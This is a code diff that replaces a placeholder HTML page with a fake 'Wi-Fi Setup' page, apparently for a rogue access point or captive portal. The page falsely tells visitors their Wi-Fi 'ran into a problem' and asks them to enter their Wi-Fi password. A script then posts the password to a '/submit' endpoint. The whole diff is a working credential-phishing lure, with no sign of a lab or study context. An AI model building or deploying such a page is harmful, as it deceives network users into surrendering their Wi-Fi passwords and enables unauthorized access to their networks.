@@ -3,9 +3,43 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Document</title>
+    <title>Wi-Fi Setup</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 50px;
+            background-color: #f4f4f4;
+        }
+        input, button {
+            padding: 10px;
+            margin: 5px;
+            font-size: 16px;
+        }
+    </style>
 </head>
 <body>
-    <h1>hi</h1>
+    <h2>Your Wi-Fi ran into a problem</h2>
+    <form id="wifiForm">
+        <label for="wifi_pass">Wi-Fi Password:</label>
+        <input type="password" id="wifi_pass" name="wifi_pass" required>
+        <button type="submit">Submit</button>
+    </form>
+    <h4>Enter you password, we are fixing this issue</h4>
+
+    <script>
+        document.getElementById("wifiForm").addEventListener("submit", function(event) {
+            event.preventDefault();
+            const wifiPassword = document.getElementById("wifi_pass").value;
+
+            fetch("/submit", {
+                method: "POST",
+                headers: { "Content-Type": "application/x-www-form-urlencoded" },
+                body: "wifi_pass=" + encodeURIComponent(wifiPassword)
+            })
+            .then(response => response.text())
+            .then(data => alert(data));
+        });
+    </script>
 </body>
 </html>
